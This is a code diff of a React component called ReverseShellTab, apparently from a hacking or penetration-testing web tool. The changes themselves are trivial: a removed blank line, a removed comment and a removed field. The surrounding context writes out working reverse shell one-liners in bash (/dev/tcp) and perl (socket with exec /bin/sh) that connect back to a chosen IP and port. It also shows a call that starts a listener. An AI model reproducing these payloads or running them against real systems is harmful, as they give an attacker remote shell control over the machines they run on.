@@ -1,4 +1,3 @@
-
 import React, { useState } from 'react';
 import { Label } from '@/components/ui/label';
 import { Input } from '@/components/ui/input';
@@ -22,7 +21,6 @@ const ReverseShellTab: React.FC<ReverseShellTabProps> = ({ isRealmode, isExecuti
   const [selectedRevShellPayload, setSelectedRevShellPayload] = useState('');
   const [copySuccess, setCopySuccess] = useState<string | null>(null);
   
-  // Reverse Shell Payloads
   const reverseShellPayloads = {
     'bash': `bash -i >& /dev/tcp/${customIp}/${customPort} 0>&1`,
     'perl': `perl -e 'use Socket;$i="${customIp}";$p=${customPort};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
@@ -59,7 +57,6 @@ const ReverseShellTab: React.FC<ReverseShellTabProps> = ({ isRealmode, isExecuti
       
       const result = await executeHackingTool({
         tool: 'listener',
-        category: 'shell',
         options: {
           ip: customIp,
           port: customPort,
